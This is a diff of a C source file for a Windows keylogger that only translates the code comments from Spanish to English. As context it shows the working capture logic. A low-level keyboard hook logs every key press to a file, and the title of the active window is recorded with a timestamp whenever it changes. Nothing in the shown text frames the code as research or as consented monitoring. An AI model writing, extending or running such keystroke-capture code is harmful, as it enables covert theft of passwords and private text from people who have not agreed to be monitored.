@@ -2,7 +2,7 @@
 
 t_WinkeyState g_winkeyState = {0};
 
-// Detecta si la ventana activa ha cambiado
+// Detects if the active window has changed
 static BOOL HasWindowChanged(void)
 {
     HWND currentWindow;
@@ -15,7 +15,7 @@ static BOOL HasWindowChanged(void)
     return FALSE;
 }
 
-// Registra la información de la ventana activa actual
+// Logs the information of the current active window
 static void LogCurrentWindow(void)
 {
     WCHAR wTitle[256];
@@ -26,7 +26,7 @@ static void LogCurrentWindow(void)
     if (!g_winkeyState.logFile)
         return;
 
-    // Obtiene el título de la ventana en wide chars y convierte a UTF-8
+    // Gets the window title in wide chars and converts to UTF-8
     if (!GetWindowTextW(g_winkeyState.lastWindow, wTitle, (int)(sizeof(wTitle)/sizeof(WCHAR)))) {
         strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
     } else {
@@ -35,7 +35,7 @@ static void LogCurrentWindow(void)
             strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
     }
 
-    // Obtiene timestamp y escribe al log
+    // Gets timestamp and writes to log
     time(&currentTime);
     localtime_s(&timeInfo, &currentTime);
 
@@ -46,7 +46,7 @@ static void LogCurrentWindow(void)
     fflush(g_winkeyState.logFile);
 }
 
-// Registra una tecla pulsada en el archivo de log
+// Logs a keystroke in the log file
 static void LogKeyStroke(DWORD vkCode)
 {
     const char *keyString;
@@ -54,12 +54,12 @@ static void LogKeyStroke(DWORD vkCode)
     if (!g_winkeyState.logFile)
         return;
 
-    // Verifica si cambió la ventana activa
+    // Check if active window changed
     if (HasWindowChanged()) {
         LogCurrentWindow();
     }
 
-    // Convierte el código de tecla a texto legible usando ToUnicodeEx
+    // Converts virtual key code to readable text using ToUnicodeEx
     keyString = VkCodeToString(vkCode);
     if (keyString && strlen(keyString) > 0) {
         fprintf(g_winkeyState.logFile, "%s", keyString);
@@ -67,18 +67,18 @@ static void LogKeyStroke(DWORD vkCode)
     }
 }
 
-// Callback del hook de teclado de bajo nivel
+// Low level keyboard hook callback
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     PKBDLLHOOKSTRUCT keyInfo;
 
-    // Solo procesar si el código es válido y es una pulsación de tecla
+    // Only process if code is valid and it's a key press
     if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         keyInfo = (PKBDLLHOOKSTRUCT)lParam;
-        // Registra la tecla pulsada
+        // Logs the pressed key
         LogKeyStroke(keyInfo->vkCode);
     }
 
-    // Pasar al siguiente hook en la cadena
+    // Pass to next hook in the chain
     return CallNextHookEx(g_winkeyState.keyboardHook, nCode, wParam, lParam);
 }
